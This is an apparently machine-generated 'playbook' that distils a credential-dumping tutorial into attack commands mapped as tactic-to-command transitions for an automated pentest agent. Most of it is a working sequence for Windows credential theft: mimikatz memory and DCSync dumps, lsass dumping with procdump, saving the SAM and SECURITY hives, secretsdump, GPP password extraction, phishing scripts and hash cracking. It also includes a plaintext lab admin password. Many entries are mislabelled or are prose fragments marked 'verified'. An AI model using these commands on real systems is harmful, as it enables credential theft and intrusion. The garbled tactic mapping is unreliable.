---
title: "Trained Command Playbook: credential_dumping.pdf"
tags:
  - covert_exfil
  - credential_access
  - defense_evasion_firewall
  - enumeration
  - http
  - https
  - impacket
  - john
  - kerberos
  - lateral_movement_routing_pivot
  - mdp
  - mimikatz
  - netsh
  - nmap
  - out-of-band_access
  - pdf
  - powershell
  - privilege_escalation
  - ssh
  - sysinternals
  - trained
source_file: credential_dumping.pdf
updated: 2026-10-24 00:58:07
---

# Trained Command Playbook: `credential_dumping.pdf`

- **Source Document:** `~/Projects/CORA/Training/credential_dumping.pdf`
- **CEGAR Verified Commands:** `81` (`0` malformed/unsafe snippets filtered)
- **MDP Tactical Transitions (`Tactic -> Technique -> Tool -> Command`):** `81`
- **Discovered IPs/Subnets:** `172.24.0.102, 172.24.1.103, 172.24.1.105, 172.24.1.108, 172.24.1.112`
- **Discovered Interfaces:** `None`
- **Related Knowledge Note:** [[knowledge/trained_credential_dumping]]

## Distilled MDP Tactical Transitions (`Tactic -> Technique -> Tool -> Command`)
| Pre-State ($s$) | Tactic ($\tau$) | Technique ($k$) | Tool ($u$) | Post-State ($s'$) | Verified Command ($c$) |
| :--- | :--- | :--- | :--- | :--- | :--- |
| `s_active_services_enumerated` | **`Credential_Access`** | Credential, Account, Kerberos Ticket, Hash Cracking & Certificate Operations | `netsh` | `s_credentials_or_certs_acquired` | `netsh wlan show profiles` |
| `s_initial_shell_or_api_access` | **`Privilege_Escalation`** | ACL/Permission Modification, Service Abuse & Privilege Escalation | `privilege::debug` | `s_interactive_tty_or_priv_escalated` | `privilege::debug` |
| `s_interactive_tty_or_priv_escalated` | **`Covert_Exfil`** | Encapsulated / Low-Signature Data Telemetry Transfer | `import-module` | `s_covert_exfil_verified` | `Import-Module .\WdigestDowngrade.ps1` |
| `s_l2_l3_verified` | **`Out-of-Band_Access`** | UART/Serial Console Out-of-Band Enumeration & Control | `crackmapexec` | `s_oob_serial_enumerated` | `crackmapexec smb 172.24.1.105 -u 'Administrator' -p 'Ignite@987' -M wdigest -o ACTION=enable` |
| `s_oob_serial_enumerated` | **`Defense_Evasion_Firewall`** | Host Firewall, Audit Policy, LOLBin & Integrity Control Adjustment | `rundll32` | `s_firewall_or_acl_unlocked` | `RunDll32.exe user32.dll,LockWorkStation` |
| `s_l2_l3_verified` | **`Enumeration`** | General System & Service Enumeration | `python` | `s_active_services_enumerated` | `python -m SimpleHTTPServer` |
| `s_firewall_or_acl_unlocked` | **`Lateral_Movement_Routing_Pivot`** | Remote Host Execution, L2/L3 Route Injection & Subnet Pivot | `telnet` | `s_cross_subnet_pivot_routed` | `telnet 172.24.0.102` |
| `s_active_services_enumerated` | **`Credential_Access`** | Credential, Account, Kerberos Ticket, Hash Cracking & Certificate Operations | `netsh` | `s_credentials_or_certs_acquired` | `netsh wlan show profile name=<SSID Name> key=clear` |
| `s_initial_shell_or_api_access` | **`Privilege_Escalation`** | ACL/Permission Modification, Service Abuse & Privilege Escalation | `token::elevate` | `s_interactive_tty_or_priv_escalated` | `token::elevate` |
| `s_interactive_tty_or_priv_escalated` | **`Covert_Exfil`** | Encapsulated / Low-Signature Data Telemetry Transfer | `invoke-wdigestdowngrade` | `s_covert_exfil_verified` | `Invoke-WdigestDowngrade` |
| `s_l2_l3_verified` | **`Out-of-Band_Access`** | UART/Serial Console Out-of-Band Enumeration & Control | `crackmapexec` | `s_oob_serial_enumerated` | `crackmapexec smb 172.24.1.105 -u 'Administrator' -p` |
| `s_firewall_or_acl_unlocked` | **`Lateral_Movement_Routing_Pivot`** | Remote Host Execution, L2/L3 Route Injection & Subnet Pivot | `telnet` | `s_cross_subnet_pivot_routed` | `telnet 172.24.0.102 110` |
| `s_active_services_enumerated` | **`Credential_Access`** | Credential, Account, Kerberos Ticket, Hash Cracking & Certificate Operations | `r2` | `s_credentials_or_certs_acquired` | `R2 Domain Controller.` |
| `s_interactive_tty_or_priv_escalated` | **`Covert_Exfil`** | Encapsulated / Low-Signature Data Telemetry Transfer | `reg` | `s_covert_exfil_verified` | `reg query` |
| `s_l2_l3_verified` | **`Out-of-Band_Access`** | UART/Serial Console Out-of-Band Enumeration & Control | `crackmapexec` | `s_oob_serial_enumerated` | `crackmapexec smb 172.24.1.105 -u` |
| `s_firewall_or_acl_unlocked` | **`Lateral_Movement_Routing_Pivot`** | Remote Host Execution, L2/L3 Route Injection & Subnet Pivot | `telnet` | `s_cross_subnet_pivot_routed` | `telnet 172.24.0.102 25` |
| `s_active_services_enumerated` | **`Credential_Access`** | Credential, Account, Kerberos Ticket, Hash Cracking & Certificate Operations | `smbclient` | `s_credentials_or_certs_acquired` | `smbclient //172.24.1.103/SYSVOL -U raj` |
| `s_interactive_tty_or_priv_escalated` | **`Covert_Exfil`** | Encapsulated / Low-Signature Data Telemetry Transfer | `reg` | `s_covert_exfil_verified` | `reg save hklm\sam c:\sam` |
| `s_active_services_enumerated` | **`Credential_Access`** | Credential, Account, Kerberos Ticket, Hash Cracking & Certificate Operations | `import-module` | `s_credentials_or_certs_acquired` | `Import-Module .\Get-GPPPassword.ps1` |
| `s_interactive_tty_or_priv_escalated` | **`Covert_Exfil`** | Encapsulated / Low-Signature Data Telemetry Transfer | `reg` | `s_covert_exfil_verified` | `reg save hklm\system` |
| `s_active_services_enumerated` | **`Credential_Access`** | Credential, Account, Kerberos Ticket, Hash Cracking & Certificate Operations | `get-gpppassword` | `s_credentials_or_certs_acquired` | `Get-GPPPassword` |
| `s_interactive_tty_or_priv_escalated` | **`Covert_Exfil`** | Encapsulated / Low-Signature Data Telemetry Transfer | `type` | `s_covert_exfil_verified` | `type <pwdump file name>` |
| `s_active_services_enumerated` | **`Credential_Access`** | Credential, Account, Kerberos Ticket, Hash Cracking & Certificate Operations | `reg` | `s_credentials_or_certs_acquired` | `reg add` |
| `s_interactive_tty_or_priv_escalated` | **`Covert_Exfil`** | Encapsulated / Low-Signature Data Telemetry Transfer | `ntdsutil` | `s_covert_exfil_verified` | `NTDSutil.exe with a bunch of parameters instructing it to make a directory called temp in the C:\ drive` |
| `s_active_services_enumerated` | **`Credential_Access`** | Credential, Account, Kerberos Ticket, Hash Cracking & Certificate Operations | `sekurlsa::wdigest` | `s_credentials_or_certs_acquired` | `sekurlsa::wdigest` |
| `s_interactive_tty_or_priv_escalated` | **`Covert_Exfil`** | Encapsulated / Low-Signature Data Telemetry Transfer | `secretsdump.py` | `s_covert_exfil_verified` | `./secretsdump.py -ntds /root/ntds.dit -system` |
| `s_active_services_enumerated` | **`Credential_Access`** | Credential, Account, Kerberos Ticket, Hash Cracking & Certificate Operations | `ip` | `s_credentials_or_certs_acquired` | `IP Address: 172.24.1.105` |
| `s_interactive_tty_or_priv_escalated` | **`Covert_Exfil`** | Encapsulated / Low-Signature Data Telemetry Transfer | `reg` | `s_covert_exfil_verified` | `reg save HKLM\SYSTEM system` |
| `s_active_services_enumerated` | **`Credential_Access`** | Credential, Account, Kerberos Ticket, Hash Cracking & Certificate Operations | `reg` | `s_credentials_or_certs_acquired` | `reg query hklm\system\currentcontrolset\control\lsa /v "Security Packages"` |
| `s_interactive_tty_or_priv_escalated` | **`Covert_Exfil`** | Encapsulated / Low-Signature Data Telemetry Transfer | `reg` | `s_covert_exfil_verified` | `reg save HKLM\security` |
| `s_active_services_enumerated` | **`Credential_Access`** | Credential, Account, Kerberos Ticket, Hash Cracking & Certificate Operations | `type` | `s_credentials_or_certs_acquired` | `type C:\Windows\System32\kiwissp.log` |
| `s_interactive_tty_or_priv_escalated` | **`Covert_Exfil`** | Encapsulated / Low-Signature Data Telemetry Transfer | `reg` | `s_covert_exfil_verified` | `reg save hklm\system c:\system` |
| `s_active_services_enumerated` | **`Credential_Access`** | Credential, Account, Kerberos Ticket, Hash Cracking & Certificate Operations | `misc::memssp` | `s_credentials_or_certs_acquired` | `misc::memssp` |
| `s_interactive_tty_or_priv_escalated` | **`Covert_Exfil`** | Encapsulated / Low-Signature Data Telemetry Transfer | `reg` | `s_covert_exfil_verified` | `reg save hklm\security c:\security` |
| `s_active_services_enumerated` | **`Credential_Access`** | Credential, Account, Kerberos Ticket, Hash Cracking & Certificate Operations | `type` | `s_credentials_or_certs_acquired` | `type C:\Windows\System32\mimilsa.log` |
| `s_interactive_tty_or_priv_escalated` | **`Covert_Exfil`** | Encapsulated / Low-Signature Data Telemetry Transfer | `python` | `s_covert_exfil_verified` | `python secretsdump.py -security -system system LOCAL` |
| `s_active_services_enumerated` | **`Credential_Access`** | Credential, Account, Kerberos Ticket, Hash Cracking & Certificate Operations | `type` | `s_credentials_or_certs_acquired` | `type mimilsa.log` |
| `s_active_services_enumerated` | **`Credential_Access`** | Credential, Account, Kerberos Ticket, Hash Cracking & Certificate Operations | `mimikatz` | `s_credentials_or_certs_acquired` | `mimikatz folder to the system32 folder in the target system. To do so, simply go to the mimikatz folder` |
| `s_active_services_enumerated` | **`Credential_Access`** | Credential, Account, Kerberos Ticket, Hash Cracking & Certificate Operations | `import-module` | `s_credentials_or_certs_acquired` | `Import-Module <'path of the powerdump script'>` |
| `s_active_services_enumerated` | **`Credential_Access`** | Credential, Account, Kerberos Ticket, Hash Cracking & Certificate Operations | `invoke-powerdump` | `s_credentials_or_certs_acquired` | `Invoke-PowerDump` |

## Verified Executable Commands (Grouped by Capability Layer)

### General_System (67 commands)
```bash
R2 Domain Controller.
smbclient //172.24.1.103/SYSVOL -U raj
Import-Module .\Get-GPPPassword.ps1
Get-GPPPassword
privilege::debug
reg add
sekurlsa::wdigest
Import-Module .\WdigestDowngrade.ps1
Invoke-WdigestDowngrade
reg query
crackmapexec smb 172.24.1.105 -u 'Administrator' -p 'Ignite@987' -M wdigest -o ACTION=enable
reg query hklm\system\currentcontrolset\control\lsa /v "Security Packages"
type C:\Windows\System32\kiwissp.log
misc::memssp
type C:\Windows\System32\mimilsa.log
RunDll32.exe user32.dll,LockWorkStation
type mimilsa.log
mimikatz folder to the system32 folder in the target system. To do so, simply go to the mimikatz folder
python -m SimpleHTTPServer
reg save hklm\sam c:\sam
reg save hklm\system
Import-Module <'path of the powerdump script'>
Invoke-PowerDump
token::elevate
lsadump::sam
./secretsdump.py -sam /root/Desktop/sam -system /root/Desktop/system LOCAL
crackmapexec smb 172.24.1.105 -u 'Administrator' -p
john -format=NT hash -show
type <pwdump file name>
NTDSutil.exe with a bunch of parameters instructing it to make a directory called temp in the C:\ drive
./secretsdump.py -ntds /root/ntds.dit -system
Set-ExecutionPolicy Unrestricted
Import-Module DSInternals
Get-BootKey -SystemHivePath 'C:\SYSTEM'
Get-ADDBAccount -All -DBPath 'C:\ntds.dit' -Bootkey
crackmapexec smb 172.24.1.105 -u
john --format=NT hash --show
Import-Module C:\Users\raj\Desktop\Invoke-
Invoke-CredentialsPhish
Invoke-LoginPrompt.ps1
./lockphish.sh
sekurlsa::minidump
sekurlsa::logonpasswords
procdump.exe -accepteula -ma lsass.exe
sekurlsa::minidump C:\Users\raj\Downloads\Procdump\mem.dmp
Get-Process lsass
sekurlsa::minidump C:\mem.dmp
sekurlsa::longonpasswords
lsadump::lsa /patch
lsadump::secrets
reg save HKLM\SYSTEM system
reg save HKLM\security
lsadump::secrets/system:c:\system /security:c:\security
lsadump::dcsync /domain:ignite.local
Import-Module AdmPwd.PS
Update-AdmPwdADSchema
Set-AdmPwdComputerSelfPermission -OrgUnit Tech
Set-AdmPwdReadPasswordPermission -OrgUnit Tech -AllowedPrincipals Administrators
reg save hklm\system c:\system
reg save hklm\security c:\security
python secretsdump.py -security -system system LOCAL
lsadump::cache
python mscache.py --security /root/Desktop/security
john --format=mscasch2 --wordlist=/usr/share/wordlists/rockyou.txt mhash
john _netntlmv2
psql -h 172.24.0.102 -U raj
mysql -h 172.24.0.102 -u root -p
```

### L3_Routing_NAT (3 commands)
```bash
netsh wlan show profiles
netsh wlan show profile name=<SSID Name> key=clear
IP Address: 172.24.1.105
```

### L4_Port_Service (11 commands)
```bash
nmap -p21 <ip address>
nmap -p23<ip address>
telnet 172.24.0.102
nmap -p5900 <ip address>
nmap -p445 <ip address>
nmap -p110 <ip address>
telnet 172.24.0.102 110
nmap -p25 <ip address>
telnet 172.24.0.102 25
nmap -p5432 <ip address>
nmap -p3306 <ip address>
```

